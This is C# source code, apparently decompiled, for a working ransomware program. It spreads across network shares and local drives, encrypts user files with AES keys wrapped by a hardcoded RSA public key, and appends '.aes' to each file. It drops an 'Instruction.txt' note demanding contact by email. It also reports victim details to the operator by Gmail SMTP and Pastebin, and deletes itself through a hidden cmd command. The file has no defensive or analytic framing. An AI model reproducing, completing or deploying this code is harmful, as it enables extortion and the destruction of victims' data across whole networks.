using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Encrypt;

internal class Program
{
	[Flags]
	public enum SV_101_TYPES : uint
	{
		SV_TYPE_WORKSTATION = 1u,
		SV_TYPE_SERVER = 2u,
		SV_TYPE_SQLSERVER = 4u,
		SV_TYPE_DOMAIN_CTRL = 8u,
		SV_TYPE_DOMAIN_BAKCTRL = 0x10u,
		SV_TYPE_TIME_SOURCE = 0x20u,
		SV_TYPE_AFP = 0x40u,
		SV_TYPE_NOVELL = 0x80u,
		SV_TYPE_DOMAIN_MEMBER = 0x100u,
		SV_TYPE_PRINTQ_SERVER = 0x200u,
		SV_TYPE_DIALIN_SERVER = 0x400u,
		SV_TYPE_XENIX_SERVER = 0x800u,
		SV_TYPE_SERVER_UNIX = 0x800u,
		SV_TYPE_NT = 0x1000u,
		SV_TYPE_WFW = 0x2000u,
		SV_TYPE_SERVER_MFPN = 0x4000u,
		SV_TYPE_SERVER_NT = 0x8000u,
		SV_TYPE_POTENTIAL_BROWSER = 0x10000u,
		SV_TYPE_BACKUP_BROWSER = 0x20000u,
		SV_TYPE_MASTER_BROWSER = 0x40000u,
		SV_TYPE_DOMAIN_MASTER = 0x80000u,
		SV_TYPE_SERVER_OSF = 0x100000u,
		SV_TYPE_SERVER_VMS = 0x200000u,
		SV_TYPE_WINDOWS = 0x400000u,
		SV_TYPE_DFS = 0x800000u,
		SV_TYPE_CLUSTER_NT = 0x1000000u,
		SV_TYPE_TERMINALSERVER = 0x2000000u,
		SV_TYPE_CLUSTER_VS_NT = 0x4000000u,
		SV_TYPE_DCE = 0x10000000u,
		SV_TYPE_ALTERNATE_XPORT = 0x20000000u,
		SV_TYPE_LOCAL_LIST_ONLY = 0x40000000u,
		SV_TYPE_DOMAIN_ENUM = 0x80000000u,
		SV_TYPE_ALL = uint.MaxValue
	}

	public struct SERVER_INFO_101
	{
		[MarshalAs(UnmanagedType.U4)]
		public uint sv101_platform_id;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string sv101_name;

		[MarshalAs(UnmanagedType.U4)]
		public uint sv101_version_major;

		[MarshalAs(UnmanagedType.U4)]
		public uint sv101_version_minor;

		[MarshalAs(UnmanagedType.U4)]
		public uint sv101_type;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string sv101_comment;
	}

	public enum PLATFORM_ID : uint
	{
		PLATFORM_ID_DOS = 300u,
		PLATFORM_ID_OS2 = 400u,
		PLATFORM_ID_NT = 500u,
		PLATFORM_ID_OSF = 600u,
		PLATFORM_ID_VMS = 700u
	}

	public enum NERR
	{
		NERR_Success = 0,
		ERROR_ACCESS_DENIED = 5,
		ERROR_NOT_ENOUGH_MEMORY = 8,
		ERROR_BAD_NETPATH = 53,
		ERROR_NETWORK_BUSY = 54,
		ERROR_INVALID_PARAMETER = 87,
		ERROR_INVALID_LEVEL = 124,
		ERROR_MORE_DATA = 234,
		ERROR_EXTENDED_ERROR = 1208,
		ERROR_NO_NETWORK = 1222,
		ERROR_INVALID_HANDLE_STATE = 1609,
		ERROR_NO_BROWSER_SERVERS_FOUND = 6118
	}

	public class GetNetShares
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct SHARE_INFO_1
		{
			public string shi1_netname;

			public uint shi1_type;

			public string shi1_remark;

			public SHARE_INFO_1(string sharename, uint sharetype, string remark)
			{
				shi1_netname = sharename;
				shi1_type = sharetype;
				shi1_remark = remark;
			}

			public override string ToString()
			{
				return shi1_netname;
			}
		}

		private enum NetError : uint
		{
			NERR_Success = 0u,
			NERR_BASE = 2100u,
			NERR_UnknownDevDir = 2116u,
			NERR_DuplicateShare = 2118u,
			NERR_BufTooSmall = 2123u
		}

		private enum SHARE_TYPE : uint
		{
			STYPE_DISKTREE = 0u,
			STYPE_PRINTQ = 1u,
			STYPE_DEVICE = 2u,
			STYPE_IPC = 3u,
			STYPE_SPECIAL = 2147483648u
		}

		private const uint MAX_PREFERRED_LENGTH = uint.MaxValue;

		private const int NERR_Success = 0;

		[DllImport("Netapi32.dll", SetLastError = true)]
		private static extern int NetApiBufferFree(IntPtr Buffer);

		[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
		private static extern int NetShareEnum(StringBuilder ServerName, int level, ref IntPtr bufPtr, uint prefmaxlen, ref int entriesread, ref int totalentries, ref int resume_handle);

		public SHARE_INFO_1[] EnumNetShares(string Server)
		{
			List<SHARE_INFO_1> list = new List<SHARE_INFO_1>();
			int entriesread = 0;
			int totalentries = 0;
			int resume_handle = 0;
			int num = Marshal.SizeOf(typeof(SHARE_INFO_1));
			IntPtr bufPtr = IntPtr.Zero;
			StringBuilder serverName = new StringBuilder(Server);
			int num2 = NetShareEnum(serverName, 1, ref bufPtr, uint.MaxValue, ref entriesread, ref totalentries, ref resume_handle);
			if (num2 == 0)
			{
				IntPtr ptr = bufPtr;
				for (int i = 0; i < entriesread; i++)
				{
					SHARE_INFO_1 item = (SHARE_INFO_1)Marshal.PtrToStructure(ptr, typeof(SHARE_INFO_1));
					list.Add(item);
					ptr = new IntPtr(ptr.ToInt32() + num);
				}
				NetApiBufferFree(bufPtr);
				return list.ToArray();
			}
			list.Add(new SHARE_INFO_1("ERROR=" + num2, 10u, string.Empty));
			return list.ToArray();
		}
	}

	private static int IV_LENGTH = 16;

	private static List<string> errorFiles = new List<string>();

	private static object locker = new object();

	private static List<string> filepaths = new List<string>();

	private static long count = 0L;

	private static int threadkol = 4;

	private static long alllen = 0L;

	private static string key = "<RSAKeyValue><Modulus>rj3tkeDAEksSaeFFYnJe9GJiK7k96N4litsaDZ8K/NpFpH2tTvHWETMatKdkwLI/p9+gcMVaXbl9S1ahFzbBLVVuDR+pXFyRXko2XtUS96vkaFjiqp7TXw+zt/Fb78TRFyb+HeB4LktilbzExreY7OgwE2g6+sVtqqxh4kvFEmsYmbyO3jwNcnJqjJaB60+ruZjCNgqLHxEC+kQn7wM6v3aTEosGMkneseI03P5VVui1FA7cVsF6bIvfqmBJRQlogSo8KmtkV0Uf4HUGljjX33cZc5meMbaS8MCBH6etSxWCVQ8GKdYgZalAhWKdE5VDA1x1YEMzxBaU7xfTa3QV7Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string txtText = "Hello. There are vulnerabilities detected on your server. All your files are encrypted. For information on decoding, please write to the e-mail ThomasRaymond@protonmail.com";

	[DllImport("KERNEL32.DLL")]
	public static extern bool RtlZeroMemory(IntPtr Destination, int Length);

	private static string Pars(string strSource, string strStart, string strEnd, int startPos)
	{
		try
		{
			int length = strStart.Length;
			string result = "";
			int num = strSource.IndexOf(strStart, startPos);
			int num2 = strSource.IndexOf(strEnd, num + length);
			if (num != -1 && num2 != -1)
			{
				result = strSource.Substring(num + length, num2 - (num + length));
			}
			return result;
		}
		catch
		{
			return "";
		}
	}

	private static string SendP(string text, string api_key, string devkey)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://pastebin.com/api/api_post.php");
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			string s = "api_option=paste&api_user_key=" + api_key + "&api_paste_private=1&api_paste_name=" + GetIp() + "&api_paste_expire_date=1M&api_paste_format=php&api_dev_key=" + devkey + "&api_paste_code=" + text;
			Encoding uTF = Encoding.UTF8;
			byte[] bytes = uTF.GetBytes(s);
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			return streamReader.ReadLine();
		}
		catch
		{
			return "";
		}
	}

	public static void SendMail(string smtpServer, string from, string password, string mailto, string caption, string message, string attachFile = null)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(from);
			mailMessage.To.Add(new MailAddress(mailto));
			mailMessage.Subject = caption;
			mailMessage.Body = message;
			if (!string.IsNullOrEmpty(attachFile))
			{
				mailMessage.Attachments.Add(new Attachment(attachFile));
			}
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Host = smtpServer;
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(from.Split(new char[1] { '@' })[0], password);
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.Send(mailMessage);
			mailMessage.Dispose();
		}
		catch (Exception ex)
		{
			throw new Exception("Mail.Send: " + ex.Message);
		}
	}

	private static string GetIp()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://whoer.net");
			WebResponse response = httpWebRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			string strSource = streamReader.ReadToEnd();
			streamReader.Close();
			return Pars(strSource, "ip: \"", "\"", 0);
		}
		catch
		{
			return "";
		}
	}

	public static string Encryption(string strText)
	{
		string text = key;
		byte[] bytes = Encoding.UTF8.GetBytes(strText);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(text.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static string CreateSalt(int size)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[size];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static byte[] AES_(byte[] buffer, byte[] passwordBytes, byte[] saltBytes, int len)
	{
		byte[] array = null;
		byte[] array2 = null;
		using MemoryStream memoryStream = new MemoryStream();
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 100);
		aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
		aesCryptoServiceProvider.IV = generateIV();
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(buffer, 0, len);
		}
		array = memoryStream.ToArray();
		array2 = new byte[array.Length + aesCryptoServiceProvider.IV.Length];
		aesCryptoServiceProvider.IV.CopyTo(array2, 0);
		array.CopyTo(array2, IV_LENGTH);
		return array2;
	}

	private static byte[] generateIV()
	{
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[IV_LENGTH];
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	private static byte[] removeTagAndIV(byte[] arr)
	{
		byte[] array = new byte[arr.Length - IV_LENGTH];
		Array.Copy(arr, IV_LENGTH, array, 0, arr.Length - IV_LENGTH);
		return array;
	}

	private static byte[] getIV(byte[] arr)
	{
		byte[] array = new byte[IV_LENGTH];
		Array.Copy(arr, 0, array, 0, IV_LENGTH);
		return array;
	}

	private static void crtp(string path)
	{
		try
		{
			string text = CreateSalt(32);
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			using FileStream fileStream = new FileStream(path, FileMode.Open);
			int num = 0;
			if (!path.Contains(".accdb") && !path.Contains(".b2") && !path.Contains(".db") && !path.Contains(".dbf") && !path.Contains(".dbf") && !path.Contains(".mdb") && !path.Contains(".mdf") && !path.Contains(".sdf") && !path.Contains(".sis") && fileStream.Length > 10485760L)
			{
				long num2 = fileStream.Length / 1048576L;
				num2 = num2 * 30L / 100L;
				for (int i = 0; i < num2; i++)
				{
					num += 1048576;
				}
			}
			if (num == 0)
			{
				num = Convert.ToInt32(fileStream.Length);
			}
			fileStream.Seek(0L, SeekOrigin.Begin);
			byte[] array = GenerateRandomSalt();
			string s = Encryption(text);
			byte[] bytes2 = Encoding.UTF8.GetBytes(s);
			byte[] array2 = new byte[1048576];
			int j;
			byte[] array3;
			for (j = 0; j < num; j += array3.Length)
			{
				int len = fileStream.Read(array2, 0, array2.Length);
				array3 = AES_(array2, bytes, array, len);
				fileStream.Seek(j, SeekOrigin.Begin);
				fileStream.Write(array3, 0, array3.Length);
			}
			fileStream.Seek(fileStream.Length, SeekOrigin.Begin);
			fileStream.Write(array, 0, array.Length);
			fileStream.Seek(fileStream.Length, SeekOrigin.Begin);
			fileStream.Write(bytes2, 0, bytes2.Length);
			lock (locker)
			{
				alllen += fileStream.Length;
			}
			using BinaryWriter binaryWriter = new BinaryWriter(fileStream);
			binaryWriter.Write(j);
		}
		catch (Exception ex)
		{
			errorFiles.Add(path + " - " + ex.Message);
		}
	}

	private static void StartCrypt(string path)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string text = Environment.CommandLine.Replace("\"", "");
		if (path.Contains("Program Files") || path.Contains("Windows") || path.Contains("ProgramData") || path.Contains("C:\\Users\\All Users\\Microsoft") || path.Contains("C:\\Users\\Default\\AppData\\Roaming\\Microsoft") || path.Contains("AppData\\Local\\Packages") || path.Contains("AppData") || path.Contains("WINDOWS") || path.Contains(".aes") || path.Contains(".sys") || path.Contains(".SYS") || path.Contains("bootmgr") || path.Contains("BOOTNXT") || path.Contains(".ani") || path.Contains(".cpl") || path.Contains(".cur") || path.Contains(".dat") || path.Contains(".deskthemepack") || path.Contains(".diagcab") || path.Contains(".diagpkg") || path.Contains(".dmp") || path.Contains(".drv") || path.Contains(".hlp") || path.Contains(".icl") || path.Contains(".icons") || path.Contains(".ico") || path.Contains(".mod") || path.Contains(".msp") || path.Contains(".msstyles") || path.Contains(".ocx") || path.Contains(".rtp") || path.Contains(".themepack") || path.Contains(".CAB") || path.Contains(".settingcontent-ms") || path.Contains(folderPath) || !(path != text) || path.Contains("Desctop") || path.Contains(".lnk") || text.ToLower().Contains(path.ToLower()) || path.Contains("Instruction.txt"))
		{
			return;
		}
		try
		{
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			crtp(path);
			stopwatch.Stop();
			Console.WriteLine(path + " - " + stopwatch.Elapsed);
			lock (locker)
			{
				count++;
			}
		}
		catch (Exception ex)
		{
			errorFiles.Add(path + " - " + ex.Message);
		}
		finally
		{
			File.Move(path, path + ".aes");
		}
	}

	private static void StartCryptDesctop(string path)
	{
		Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string text = Environment.CommandLine.Replace("\"", "");
		text = text.ToLower();
		if (path.Contains(".aes") || path.Contains(".sys") || path.Contains(".SYS") || path.Contains("bootmgr") || path.Contains("BOOTNXT") || path.Contains(".ani") || path.Contains(".cpl") || path.Contains(".cur") || path.Contains(".dat") || path.Contains(".deskthemepack") || path.Contains(".diagcab") || path.Contains(".diagpkg") || path.Contains(".dmp") || path.Contains(".drv") || path.Contains(".hlp") || path.Contains(".icl") || path.Contains(".icons") || path.Contains(".ico") || path.Contains(".mod") || path.Contains(".msp") || path.Contains(".msstyles") || path.Contains(".ocx") || path.Contains(".rtp") || path.Contains(".themepack") || path.Contains(".CAB") || path.Contains(".settingcontent-ms") || text.ToLower().Contains(path.ToLower()) || path.Contains(".lnk"))
		{
			return;
		}
		try
		{
			try
			{
				new Stopwatch();
				crtp(path);
				lock (locker)
				{
					count++;
				}
			}
			finally
			{
				File.Move(path, path + ".aes");
			}
		}
		catch
		{
		}
	}

	private static void DirSearch(string sDir)
	{
		try
		{
			Directory.EnumerateFiles(sDir, "*.*").AsParallel().WithDegreeOfParallelism(threadkol)
				.ForAll(StartCrypt);
			File.WriteAllText(sDir + "\\Instruction.txt", txtText);
			File.WriteAllLines(Path.GetTempPath() + "\\ErrorLogAes.bin", errorFiles);
		}
		catch
		{
		}
		try
		{
			foreach (string item in from d in Directory.EnumerateDirectories(sDir)
				where !d.Contains("Program Files") && !d.Contains("Windows") && !d.Contains("ProgramData") && !d.Contains("C:\\Users\\All Users\\Microsoft") && !d.Contains("AppData") && !d.Contains("C:\\Drivers") && !d.Contains("\\Desctop") && !d.Contains("WINDOWS") && !d.Contains("windows")
				select d)
			{
				if (!item.Contains("Program Files") && !item.Contains("Windows") && !item.Contains("ProgramData") && !item.Contains("C:\\Users\\All Users\\Microsoft") && !item.Contains("C:\\Users\\Default\\AppData\\Roaming\\Microsoft") && !item.Contains("AppData\\Local\\Packages") && !item.Contains("AppData"))
				{
					DirSearch(item);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static void DirSearchDES(string sDir)
	{
		try
		{
			Directory.EnumerateFiles(sDir, "*.*").AsParallel().WithDegreeOfParallelism(threadkol)
				.ForAll(StartCryptDesctop);
			File.WriteAllText(sDir + "\\Instruction.txt", txtText);
			File.WriteAllLines(Path.GetTempPath() + "\\ErrorLogAes.bin", errorFiles);
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				DirSearchDES(sDir2);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void DirSearchNewFiles(string sDir)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(sDir);
			DateTime from_date = DateTime.Now.AddMonths(-3);
			DateTime to_date = DateTime.Now;
			Console.WriteLine(sDir);
			(from file in directoryInfo.EnumerateFiles("*.*")
				where file.LastWriteTime >= from_date && file.LastWriteTime <= to_date
				select file).AsParallel().WithDegreeOfParallelism(threadkol).ForAll(delegate(FileInfo d)
			{
				StartCrypt(d.FullName);
			});
			File.WriteAllText(sDir + "\\Instruction.txt", txtText);
			File.WriteAllLines(Path.GetTempPath() + "\\ErrorLogAes.bin", errorFiles);
		}
		catch
		{
		}
		try
		{
			foreach (string item in from d in Directory.EnumerateDirectories(sDir)
				where !d.Contains("Program Files") && !d.Contains("Windows") && !d.Contains("ProgramData") && !d.Contains("C:\\Users\\All Users\\Microsoft") && !d.Contains("AppData") && !d.Contains("C:\\Drivers") && !d.Contains("\\Desctop") && !d.Contains("WINDOWS") && !d.Contains("windows")
				select d)
			{
				if (!item.Contains("Program Files") && !item.Contains("Windows") && !item.Contains("ProgramData") && !item.Contains("C:\\Users\\All Users\\Microsoft") && !item.Contains("C:\\Users\\Default\\AppData\\Roaming\\Microsoft") && !item.Contains("AppData\\Local\\Packages") && !item.Contains("AppData"))
				{
					DirSearchNewFiles(item);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	[DllImport("netapi32.dll")]
	public static extern NERR NetServerEnum([MarshalAs(UnmanagedType.LPWStr)] string ServerName, int Level, out IntPtr BufPtr, int PrefMaxLen, ref int EntriesRead, ref int TotalEntries, SV_101_TYPES ServerType, [MarshalAs(UnmanagedType.LPWStr)] string Domain, int ResumeHandle);

	[DllImport("netapi32.dll")]
	public static extern NERR NetApiBufferFree(IntPtr Buffer);

	public static ArrayList GetServerList(SV_101_TYPES type)
	{
		IntPtr BufPtr = IntPtr.Zero;
		int EntriesRead = 0;
		int TotalEntries = 0;
		ArrayList arrayList = new ArrayList();
		try
		{
			NERR nERR = NetServerEnum(null, 101, out BufPtr, -1, ref EntriesRead, ref TotalEntries, type, null, 0);
			if (nERR == NERR.NERR_Success || nERR == NERR.ERROR_MORE_DATA)
			{
				if (BufPtr != IntPtr.Zero)
				{
					int num = BufPtr.ToInt32();
					for (int i = 0; i < EntriesRead; i++)
					{
						SERVER_INFO_101 structure = (SERVER_INFO_101)Marshal.PtrToStructure(new IntPtr(num), typeof(SERVER_INFO_101));
						arrayList.Add(structure.sv101_name);
						num += Marshal.SizeOf(structure);
					}
					return arrayList;
				}
				return arrayList;
			}
			return arrayList;
		}
		catch (Exception)
		{
			return arrayList;
		}
		finally
		{
			if (BufPtr != IntPtr.Zero)
			{
				NetApiBufferFree(BufPtr);
			}
		}
	}

	public static void GetShareNames()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = false;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		int startIndex = 0;
		int num = 0;
		while (true)
		{
			startIndex = text.IndexOf('\\', startIndex);
			if (startIndex != -1)
			{
				num = text.IndexOf('\n', startIndex);
				startIndex = num;
				continue;
			}
			break;
		}
	}

	private static void Main(string[] args)
	{
		string text = "";
		string text2 = "";
		string from = "viktorseccu@gmail.com";
		string text3 = "qawszaxs12";
		string text4 = "HamburgLaserIndusris@gmail.com";
		string smtpServer = "smtp.gmail.ru";
		string text5 = "10";
		if (text5 == "")
		{
			text5 = "10";
		}
		threadkol = Convert.ToInt32(text5);
		Stopwatch stopwatch = new Stopwatch();
		Environment.CommandLine.Replace("\"", "");
		stopwatch.Start();
		GetShareNames();
		ArrayList serverList = GetServerList(SV_101_TYPES.SV_TYPE_ALL);
		DriveInfo[] drives = DriveInfo.GetDrives();
		List<string> alldr = new List<string>();
		if (serverList.Count < 1)
		{
			serverList = GetServerList(SV_101_TYPES.SV_TYPE_ALL);
		}
		foreach (string name in serverList)
		{
			try
			{
				GetNetShares getNetShares = new GetNetShares();
				GetNetShares.SHARE_INFO_1[] source = getNetShares.EnumNetShares(name);
				source.Where((GetNetShares.SHARE_INFO_1 d) => !d.ToString().Contains("$")).AsParallel().ForAll(delegate(GetNetShares.SHARE_INFO_1 d)
				{
					alldr.Add("\\\\" + name + "\\" + d.ToString());
				});
			}
			catch
			{
			}
		}
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			alldr.Add(driveInfo.Name);
		}
		try
		{
			alldr.AsParallel().ForAll(delegate(string d)
			{
				DirSearchNewFiles(d);
			});
			alldr.AsParallel().ForAll(delegate(string d)
			{
				DirSearch(d);
			});
		}
		catch (Exception ex)
		{
			Console.WriteLine("start err" + ex.Message);
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			DirSearchDES(folderPath);
			File.WriteAllText(folderPath + "\\Instruction.txt", txtText);
			Process.Start(folderPath + "\\Instruction.txt");
		}
		catch
		{
		}
		stopwatch.Stop();
		try
		{
			string ip = GetIp();
			string text6 = "";
			foreach (string errorFile in errorFiles)
			{
				text6 = text6 + errorFile + Environment.NewLine;
			}
			if (text != "" || text2 != "")
			{
				SendP("PC = " + Environment.MachineName + ",Time  =" + stopwatch.Elapsed.ToString() + ", Files =" + count + ", Size =" + alllen.ToString() + " byte, Error Files: " + text6, text, text2);
			}
			if (text4 != "" || text3 != "")
			{
				SendMail(smtpServer, from, text3, text4, ip, "PC = " + Environment.MachineName + ", Time  =" + stopwatch.Elapsed.ToString() + ", Files =" + count + "Size =" + alllen.ToString() + " byte");
			}
		}
		catch (Exception ex2)
		{
			Console.WriteLine(" send err " + ex2.Message);
		}
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo)!.Dispose();
			Process.GetCurrentProcess().Kill();
		}
		catch (Exception ex3)
		{
			Console.WriteLine(" delete err " + ex3.Message);
		}
	}
}
